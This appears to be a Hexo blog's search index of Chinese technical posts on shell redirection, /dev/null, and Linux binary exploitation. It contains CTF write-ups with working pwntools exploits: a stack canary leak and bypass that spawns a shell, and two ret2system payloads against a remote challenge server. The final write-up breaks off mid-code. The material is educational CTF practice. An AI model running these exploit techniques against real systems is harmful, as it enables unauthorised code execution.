<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>blog migrate butterfly</title>
      <link href="2020/12/24/2020-12-24-blog_migrate/"/>
      <url>2020/12/24/2020-12-24-blog_migrate/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell重定向＆&gt;file、2&gt;&amp;1、1&gt;&amp;2的区别</title>
      <link href="2020/12/24/2020-12-24-linux_shell_devnull%20copy/"/>
      <url>2020/12/24/2020-12-24-linux_shell_devnull%20copy/</url>
      
        <content type="html"><![CDATA[<p> shell上:<br>0表示标准输入<br>1表示标准输出<br>2表示标准错误输出</p><blockquote><p>默认为标准输出重定向，与 1&gt; 相同<br>2&gt;&amp;1 意思是把 标准错误输出 重定向到 标准输出.<br>&amp;&gt;file 意思是把 标准输出 和 标准错误输出 都重定向到文件file中</p></blockquote><p>用例子说话：</p><pre><code>1. grep da * 1&gt;&amp;2 2. rm -f $(find / -name core) &amp;&gt; /dev/null</code></pre><p>上面两例中的 &amp; 如何理解，&amp;不是放到后台执行吗?</p><p>牛解：</p><p>1.&amp;&gt;file或n&gt;&amp;m均是一个独立的重定向符号，不要分开来理解。</p><p>2.明确文件和文件描述符的区别。</p><p>3.&amp;&gt;file表示重定向标准输出和错误到文件</p><pre><code>rm -f $(find / -name core) &amp;&gt; /dev/null，/dev/null是一个文件，这个文件比较特殊，所有传给它的东西它都丢弃掉。</code></pre><p>4.n&gt;&amp;m表示使文件描述符n成为输出文件描述符m的副本。这样做的好处是，有的时候你查找文件的时候很容易产生无用的信息</p><pre><code>例如：2&gt; /dev/null的作用就是不显示标准错误输出；另外当你运行某些命令的时候,出错信息也许很重要,便于你检查是哪出了毛病,如:2&gt;&amp;1例如：注意，为了方便理解，必须设置一个环境使得执行grep da *命令会有正常输出和错误输出，然后分别使用下面的命令生成三个文件：grep da * &gt; greplog1grep da * &gt; greplog2 1&gt;&amp;2   grep da * &gt; greplog3 2&gt;&amp;1  查看greplog1会发现里面只有正常输出内容查看greplog2会发现里面什么都没有查看greplog3会发现里面既有正常输出内容又有错误输出内容</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux /dev/null详解</title>
      <link href="2020/12/24/2020-12-24-linux_shell_devnull/"/>
      <url>2020/12/24/2020-12-24-linux_shell_devnull/</url>
      
        <content type="html"><![CDATA[<p>/dev/null 和 /dev/zero的区别<br>1./dev/null:表示 的是一个黑洞，通常用于丢弃不需要的数据输出， 或者用于输入流的空文件</p><pre><code>1.1 将无用的输出流写入到黑洞丢弃。    curl -Iwww.baidu.com 2&gt;/dev/null | head -l  错误信息定位到黑洞1.2 清空文件         cat /dev/null &gt; /home/omc/h.txt1.3 在书写定时任务总，规范的写法就是将所有定时任务脚本结尾加上&gt;/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃。    00 01 * * * /bin/sh/server/scripts/mysqlbak.sh &gt;/dev/null 2&gt;&amp;1</code></pre><p>2./dev/zero:当我们使用或者读取他的时候，她是会提供无限连续不断的空的数据流</p><pre><code>2.1覆盖其他的文件信息2.2产生指定大小的空文件，如交换文件，模拟虚拟文件系统    </code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地搭建ctf-wiki</title>
      <link href="2020/12/24/2020-12-24-local_ctf_wiki/"/>
      <url>2020/12/24/2020-12-24-local_ctf_wiki/</url>
      
        <content type="html"><![CDATA[<pre><code># 1. clonegit clone git@github.com:ctf-wiki/ctf-wiki.git# 2. requirementspip install -r requirements.txt -i https://pypi.douban.com/simple/# generate static file in site/mkdocs build# deploy at http://127.0.0.1:8000mkdocs serve</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux pwn GOT PLT</title>
      <link href="2020/12/23/2020-12-23-linux_pwn_GOT_PLT/"/>
      <url>2020/12/23/2020-12-23-linux_pwn_GOT_PLT/</url>
      
        <content type="html"><![CDATA[<p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT PLT</a></p>]]></content>
      
      
      <categories>
          
          <category> linux pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> got </tag>
            
            <tag> plt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux pwn canary</title>
      <link href="2020/12/23/2020-12-23-linux_pwn_canary/"/>
      <url>2020/12/23/2020-12-23-linux_pwn_canary/</url>
      
        <content type="html"><![CDATA[<h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="0x1-简介"><a href="#0x1-简介" class="headerlink" title="0x1 简介"></a>0x1 简介</h3><p>canary是什么？来看看ctf-wiki上的详细解释</p><pre><code>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</code></pre><p>简单地说，就是用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出了。</p><p>比如一个输入函数能够输入100个字节的内容，但是它的变量只有50个字节的大小，因为这个程序是可以接受你输入超过50个字节大小的内容的。我们就可以先输入50个字节的无用数据，然后再输入一串你想跳转到的地址把后面的return函数存在的原本的地址覆盖了，这样程序执行完这个输入函数就会跳转到你输入的那个地址去。</p><p>而canary则是在这个变量的末尾和返回地址之间加上一段canary word（比如aaaaaaaabbb\x00），当你执行到返回函数那里时会把（aaaaaaaabb\x00）和原本存在变量末尾的内容进行比较，如果发现不一样程序就会崩溃。因为你要是想要修改返回地址的话，你一定要把内容写过这个变量，就一定会覆盖掉这串canary字符，而且这些字符是随机的，不能提前写入。</p><h3 id="0x2-原理"><a href="#0x2-原理" class="headerlink" title="0x2 原理"></a>0x2 原理</h3><p>在栈底放一个随机数，在函数返回时检查是否被修改。具体实现如下：</p><p>在函数序言部分插入canary值：函数序言：</p><pre><code>mov    rax,QWORD PTR fs:0x28mov    QWORD PTR [rbp-0x8],rax</code></pre><p>在函数返回之前，会将该值取出，检查是否修改。这个操作即为检测是否发生栈溢出。</p><pre><code>mov    rax,QWORD PTR [rbp-0x8]xor    rax,QWORD PTR fs:0x28je     0x401232 &lt;vuln+102&gt; # 正常函数返回call   0x401040 &lt;__stack_chk_fail@plt&gt; # 调用出错处理函数</code></pre><p>x64 栈结构大致如下：</p><pre><code>    High    Address |                 |            +-----------------+            | args            |            +-----------------+            | return address  |            +-----------------+            | old ebp         |  rbp =&gt;    +-----------------+            | canary value    |rbp-8 =&gt;    +-----------------+            | 局部变量         |    Low     |                 |    Address</code></pre><h3 id="0x3-绕过"><a href="#0x3-绕过" class="headerlink" title="0x3 绕过"></a>0x3 绕过</h3><h4 id="0x3-1-泄露栈中的Canary"><a href="#0x3-1-泄露栈中的Canary" class="headerlink" title="0x3.1 泄露栈中的Canary"></a>0x3.1 泄露栈中的Canary</h4><p>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。<br>利用示例</p><p>源代码如下：</p><pre><code>// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123;    system(&quot;/bin/sh&quot;);&#125;void init() &#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);    setbuf(stderr, NULL);&#125;void vuln() &#123;    char buf[100];    for(int i=0;i&lt;2;i++)&#123;        read(0, buf, 0x200);        printf(buf);    &#125;&#125;int main(void) &#123;    init();    puts(&quot;Hello Hacker!&quot;);    vuln();    return 0;&#125;</code></pre><p>编译为64位程序，开启 NX，ASLR，Canary 保护,需要关闭PIE</p><pre><code>gcc -no-pie -fstack-protector ex2.c -o ex2-x64</code></pre><p>PS：GCC 中使用以下参数设置 Canary:</p><pre><code>-fstack-protector 启用保护，仅对使用&gt;=8字节(–param=ssp-buffer-size=N, 默认N=8)的char数组的函数提供保护，因此其保护能力有限。-fstack-protector-all 启用保护，为所有函数插入保护；因此会增加程序体积，以及占用栈空间，尤其内核栈空间固定的情况。-fstack-protector-strong 它对是否在函数中加入canary有其筛选原则，比如 当本地变量的地址作为赋值表达式右值的一部分，或作为函数参数；当本地变量是数组（或包含数组的union 类型），不管数组大小与类型；等等-fno-stack-protector 禁用保护</code></pre><p>EXP</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-  from pwn import *context.binary = &#39;ex2-x64&#39;# context.log_level = &#39;debug&#39;io = process(&#39;./ex2-x64&#39;)get_shell = ELF(&quot;./ex2-x64&quot;).sym[&quot;getshell&quot;] # 这里是得到getshell函数的起始地址io.recvuntil(&quot;Hello Hacker!\n&quot;)# leak Canarypayload = &quot;A&quot;*100 + &quot;A&quot; * 4 # 这里再加4个 A 是因为 100 模 8 是 4 ，如果不补齐 8 位，则无法覆盖canary后面的 \x00io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 &#39;\n&#39; 对应的十六进制就是0xaio.recvuntil(&quot;A&quot;*104)Canary = u64(io.recv(8))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canarylog.info(&quot;Canary:&quot;+hex(Canary))# Bypass Canarypayload = b&quot;\x90&quot;*104+p64(Canary)+b&quot;\x90&quot;*8+p64(get_shell) # 使用getshell的函数地址覆盖原来的返回地址io.send(payload)io.recv()io.interactive()</code></pre><p>gdb调试</p><pre><code>输入104个A栈空间0x7fffffffdf80:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf88:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf90:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf98:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfa0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfa8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfb0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfb8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfc0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfc8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfd0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfd8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfe0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfe8:    0x0a    0x28    0x5a    0x99    0x79    0x21    0x31    0x3e0x7fffffffdff0:    0x00    0xe0    0xff    0xff    0xff    0x7f    0x00    0x000x7fffffffdff8:    0x54    0x12    0x40    0x00    0x00    0x00    0x00    0x00修改为（0x7fffffffdfe8-&gt;0x995a2800,0x7fffffffdff8-&gt;0x00401172）0x7fffffffdf80:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf88:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf90:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdf98:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfa0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfa8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfb0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfb8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfc0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfc8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfd0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfd8:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfe0:    0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x410x7fffffffdfe8:    0x00    0x28    0x5a    0x99    0x79    0x21    0x31    0x3e0x7fffffffdff0:    0x00    0xe0    0xff    0xff    0xff    0x7f    0x00    0x000x7fffffffdff8:    0x72    0x11    0x40    0x00    0x00    0x00    0x00    0x00即可get_shell</code></pre><h4 id="0x3-2-one-by-one-爆破-Canary"><a href="#0x3-2-one-by-one-爆破-Canary" class="headerlink" title="0x3.2 one-by-one 爆破 Canary"></a>0x3.2 one-by-one 爆破 Canary</h4><p>感觉用处不大，具体的可以看参考链接 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/#one-by-one-canary">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/#one-by-one-canary</a></p><h4 id="0x3-3-劫持-stack-chk-fail-函数"><a href="#0x3-3-劫持-stack-chk-fail-函数" class="headerlink" title="0x3.3 劫持__stack_chk_fail 函数"></a>0x3.3 劫持__stack_chk_fail 函数</h4><p>已知 Canary 失败的处理逻辑会进入到 __stack_chk_fail 函数，__stack_chk_fail 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用</p><p>参考链接：<br>谷歌大佬博客 <a href="https://1ce0ear.github.io/2017/09/29/ZCTF2017-login/">https://1ce0ear.github.io/2017/09/29/ZCTF2017-login/</a><br><a href="https://jontsang.github.io/post/34549.html">https://jontsang.github.io/post/34549.html</a></p><h4 id="0x3-4-覆盖-TLS-中储存的-Canary-值"><a href="#0x3-4-覆盖-TLS-中储存的-Canary-值" class="headerlink" title="0x3.4 覆盖 TLS 中储存的 Canary 值"></a>0x3.4 覆盖 TLS 中储存的 Canary 值</h4><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p><p>参考链接：<a href="https://jontsang.github.io/post/34550.html">https://jontsang.github.io/post/34550.html</a></p><p>本文参考资料：</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p><p><a href="https://www.cnblogs.com/ttxs69/p/pwn_canary.html">https://www.cnblogs.com/ttxs69/p/pwn_canary.html</a></p><p><a href="https://www.cnblogs.com/luocodes/p/13912281.html">https://www.cnblogs.com/luocodes/p/13912281.html</a></p><p><a href="https://blog.csdn.net/rchaos/article/details/105147321">https://blog.csdn.net/rchaos/article/details/105147321</a></p><p>以上均是自己所学所思，记录下来增加自身理解，若有不当之处敬请各位大佬批评指正。</p>]]></content>
      
      
      <categories>
          
          <category> linux pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux pwn Format String Vulnerability Principle</title>
      <link href="2020/12/23/2020-12-23-linux_pwn_fmtstr_vuln/"/>
      <url>2020/12/23/2020-12-23-linux_pwn_fmtstr_vuln/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/">格式化字符串漏洞</a></p><p><a href="https://xz.aliyun.com/t/7398">https://xz.aliyun.com/t/7398</a></p><p><a href="https://xz.aliyun.com/t/7110">https://xz.aliyun.com/t/7110</a></p>]]></content>
      
      
      <categories>
          
          <category> linux pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux pwn pwntools使用</title>
      <link href="2020/12/23/2020-12-23-linux_pwn_pwntools/"/>
      <url>2020/12/23/2020-12-23-linux_pwn_pwntools/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/index.html">pwntools使用</a></p>]]></content>
      
      
      <categories>
          
          <category> linux pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> got </tag>
            
            <tag> plt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程目录</title>
      <link href="2020/12/22/2020-12-22-course_catalogue/"/>
      <url>2020/12/22/2020-12-22-course_catalogue/</url>
      
        <content type="html"><![CDATA[<h1 id="EasyCrawl课程目录"><a href="#EasyCrawl课程目录" class="headerlink" title="EasyCrawl课程目录"></a>EasyCrawl课程目录</h1><ol><li>大数据时代获取高质量整洁数据 网络爬虫</li></ol><p>去水印<br><a href="https://www.zhihu.com/question/333086833/answer/841650555">https://www.zhihu.com/question/333086833/answer/841650555</a></p><p><a href="https://www.v2ex.com/t/599596">https://www.v2ex.com/t/599596</a></p><p><a href="https://github.com/zxq2233/n2n-watermark-remove">https://github.com/zxq2233/n2n-watermark-remove</a></p><p>2.windows安装虚拟机</p><p>3.python正则表达式</p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python正则表达式</title>
      <link href="2020/12/22/2020-12-22-python_regex/"/>
      <url>2020/12/22/2020-12-22-python_regex/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/python_regex.png"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 cgpwn2</title>
      <link href="2020/12/21/2020-12-21-CTF_world_pwn_newbee_cgpwn2/"/>
      <url>2020/12/21/2020-12-21-CTF_world_pwn_newbee_cgpwn2/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为cgpwn2</p><p>进行通过file判断附件文件类型</p><pre><code>$ file cgpwn2cgpwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=86982eca8585ab1b30762b8479a6071dbf584559, not stripped</code></pre><p>checksec一下，检查一下保护机制,栈不可执行保护</p><pre><code>$ pwn checksec cgpwn2 [*] &#39;/root/Desktop/ctf-world-pwn/cgpwn2/cgpwn2&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>nc连接(或者本地运行)，尝试运行一下，没啥功能</p><p>   ./cgpwn2<br>    please tell me your name<br>    123<br>    hello,you can leave some message here:<br>    123<br>    thank you</p><p>IDA反编译</p><p>main函数中没有什么特殊,首先定义三个流的缓冲区，然后调用hello函数，然后打印“thank you”,然后程序结束</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;    setbuf(stdin, 0);    setbuf(stdout, 0);    setbuf(stderr, 0);    hello();    puts(&quot;thank you&quot;);    return 0;&#125;</code></pre><p>hello函数 程序的前面一部分有点复杂，这里我们先不看了然后上面的部分执行完之后，我们看看下面的部分。首先要求我们输入一个名字，这个输入是通过fgets函数完成的，从键盘读取最多32h个字符到name。然后提示我们输入一些信息，这个输入是通过gets函数完成的，没有输入字符数量的限制，从键盘读取字符到s。看看name和s是什么区域:name是bss段的一个大小为34的区域，s的起始位置是运行时距离栈帧0x26个字节的地方，大小不限。</p><pre><code>char *hello()&#123;    char *v0; // eax@1    signed int v1; // ebx@1    unsigned int v2; // ecx@3    char *v3; // eax@5    char s; // [sp+12h] [bp-26h]@1    int v6; // [sp+14h] [bp-24h]@2    v0 = &amp;s;    v1 = 30;    if ( (unsigned int)&amp;s &amp; 2 )    &#123;        *(_WORD *)&amp;s = 0;        v0 = (char *)&amp;v6;        v1 = 28;    &#125;    v2 = 0;    do    &#123;        *(_DWORD *)&amp;v0[v2] = 0;        v2 += 4;    &#125;    while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );    v3 = &amp;v0[v2];    if ( v1 &amp; 2 )    &#123;        *(_WORD *)v3 = 0;        v3 += 2;    &#125;    if ( v1 &amp; 1 )        *v3 = 0;    puts(&quot;please tell me your name&quot;);    fgets(name, 50, stdin);    puts(&quot;hello,you can leave some message here:&quot;);    return gets(&amp;s);&#125;</code></pre><p>pwn函数 在实际运行过程中pwn函数并不会被调用，我们看看这个函数，这个函数是利用系统调用打印”hehehe”,存在一个call system</p><pre><code>int pwn()&#123;    return system(&quot;echo hehehe&quot;);&#125;</code></pre><p>在我们分析程序逻辑时我们可以看到在hello函数中有一个部分我们用gets函数向栈的s区域读取了字符串，结合gets函数不限制输入字符个数和程序没有开启stack保护两点，我们可以在使用输入时让输入的字符串覆盖栈上hello函数的返回地址，让程序执行完hello函数之后执行我们设计的部分。</p><p>我们向name区域输入/bin/sh,然后让这个地址作为system函数的参数，完成system(“/bin/sh”)，获取flag。</p><p>exp1:</p><pre><code>from pwn import *# r = process(&#39;./cgpwn2&#39;)r = remote(&quot;220.249.52.134&quot;,31968)sys_addr = 0x08048420bin_bash_addr = 0x0804A080payload = &#39;a&#39;*0x26+&#39;a&#39;*4+p32(sys_addr)+&#39;a&#39;*4+p32(bin_bash_addr)r.recvuntil(&quot;please tell me your name\n&quot;)r.sendline(&quot;/bin/sh\x00&quot;)r.recvuntil(&quot;hello,you can leave some message here:\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>payload构造：</p><pre><code>payload计算为：38(0x26)+4($ebp)+4($eip-&gt;system_addr)+4(system_ret_addr)+4(system_args)32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</code></pre><p>exp2:</p><pre><code>from pwn import *# r = process(&#39;./cgpwn2&#39;)r = remote(&quot;220.249.52.134&quot;,31968)pwn_sys_addr = 0x0804855Abin_bash_addr = 0x0804A080payload = &#39;a&#39;*0x26+&#39;a&#39;*4+p32(pwn_sys_addr)+p32(bin_bash_addr)r.recvuntil(&quot;please tell me your name\n&quot;)r.sendline(&quot;/bin/sh\x00&quot;)r.recvuntil(&quot;hello,you can leave some message here:\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>payload构造：</p><pre><code>|填充栈|覆盖保存的exp的值|假的返回地址，指向pwn函数中callsystem|callsystem的参数|</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 string</title>
      <link href="2020/12/21/2020-12-21-CTF_world_pwn_newbee_string/"/>
      <url>2020/12/21/2020-12-21-CTF_world_pwn_newbee_string/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为string</p><p>进行通过file判断附件文件类型</p><pre><code>$ file stringstring: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</code></pre><p>checksec一下，检查一下保护机制,打开了RELRO、Canary和NX，那就没办法做栈溢出了</p><pre><code>$ pwn checksec string[*] &#39;/root/Desktop/ctf-world-pwn/string/string&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>逆向重要的函数</p><p>main函数</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;    _DWORD *v3; // rax    _DWORD *v4; // ST18_8    setbuf(stdout, 0LL);    alarm(0x3Cu);    sub_400996(60LL, 0LL);    v3 = malloc(8uLL);    v4 = v3;    *v3 = 68;    v3[1] = 85;    puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);    puts(&quot;we will tell you two secret ...&quot;);    printf(&quot;secret[0] is %x\n&quot;, v4, a2);    printf(&quot;secret[1] is %x\n&quot;, v4 + 1);    puts(&quot;do not tell anyone &quot;);    sub_400D72(v4);    puts(&quot;The End.....Really?&quot;);    return 0LL;&#125;</code></pre><p>可以看到，main 函数做了如下工作：</p><pre><code>调用了 alarm 函数，并设置了计时为 60s ，也就是说程序会在 60s 后退出调用 sub_400996 ，这个函数主要用于输出，比如那条龙就是它的结果分配了8个字节的空间，对低4位赋值为 68 ，高4位赋值为 85将分配的空间的低四位的地址和高四位的地址分别输出用分配出来的空间的起始地址做参数调用了 sub_400D72</code></pre><p>在这些工作中，对解题有帮助的是输出的两个地址以及分配的空间中的两个值</p><p>sub_400D72函数</p><pre><code>unsigned __int64 __fastcall sub_400D72(__int64 a1)&#123;    char s; // [rsp+10h] [rbp-20h]    unsigned __int64 v3; // [rsp+28h] [rbp-8h]    v3 = __readfsqword(0x28u);    puts(&quot;What should your character&#39;s name be:&quot;);    _isoc99_scanf(&quot;%s&quot;, &amp;s);    if ( strlen(&amp;s) &lt;= 0xC )    &#123;        puts(&quot;Creating a new player.&quot;);        sub_400A7D(&quot;Creating a new player.&quot;);        sub_400BB9();        sub_400CA6(a1);    &#125;    else    &#123;        puts(&quot;Hei! What&#39;s up!&quot;);    &#125;    return __readfsqword(0x28u) ^ v3;&#125;</code></pre><p>完成的工作如下：</p><pre><code>获取输入如果输入的长度大于 12 则回到 main 函数并退出否则继续按顺序调用三个函数，其中第三个函数使用了 main 中得到的地址</code></pre><p>sub_400A7D函数</p><pre><code>unsigned __int64 sub_400A7D()&#123;    char s1; // [rsp+0h] [rbp-10h]    unsigned __int64 v2; // [rsp+8h] [rbp-8h]    v2 = __readfsqword(0x28u);        ......    while ( 1 )    &#123;        _isoc99_scanf(&quot;%s&quot;, &amp;s1);        if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )        break;        puts(&quot;hei! I&#39;m secious!&quot;);        puts(&quot;So, where you will go?:&quot;);    &#125;    if ( strcmp(&amp;s1, &quot;east&quot;) )    &#123;        if ( !strcmp(&amp;s1, &quot;up&quot;) )        sub_4009DD(&amp;s1, &quot;up&quot;);        puts(&quot;YOU KNOW WHAT YOU DO?&quot;);        exit(0);    &#125;    return __readfsqword(0x28u) ^ v2;&#125;</code></pre><p>完成的工作如下：</p><pre><code>一直获取输入，直到输入为 east 为止才能进行下一个流程</code></pre><p>sub_400BB9函数</p><pre><code>unsigned __int64 sub_400BB9()&#123;    int v1; // [rsp+4h] [rbp-7Ch]    __int64 v2; // [rsp+8h] [rbp-78h]    char format; // [rsp+10h] [rbp-70h]    unsigned __int64 v4; // [rsp+78h] [rbp-8h]    v4 = __readfsqword(0x28u);    v2 = 0LL;    ......    _isoc99_scanf(&quot;%d&quot;, &amp;v1);    if ( v1 == 1 )    &#123;        puts(&quot;A voice heard in your mind&quot;);        puts(&quot;&#39;Give me an address&#39;&quot;);        _isoc99_scanf(&quot;%ld&quot;, &amp;v2);        puts(&quot;And, you wish is:&quot;);        _isoc99_scanf(&quot;%s&quot;, &amp;format);        puts(&quot;Your wish is&quot;);        printf(&amp;format, &amp;format);        puts(&quot;I hear it, I hear it....&quot;);    &#125;    return __readfsqword(0x28u) ^ v4;&#125;</code></pre><p>完成的工作如下：</p><pre><code>获取输入，如果输入的值不是 1 ，那么直接进行下一个流程如果输入的值是 1，那么存在格式化字符串漏洞，目前还看不出它的意义</code></pre><p>sub_400CA6函数</p><pre><code>unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)&#123;    void *v1; // rsi    unsigned __int64 v3; // [rsp+18h] [rbp-8h]    v3 = __readfsqword(0x28u);    ......    if ( *a1 == a1[1] )    &#123;        puts(&quot;Wizard: 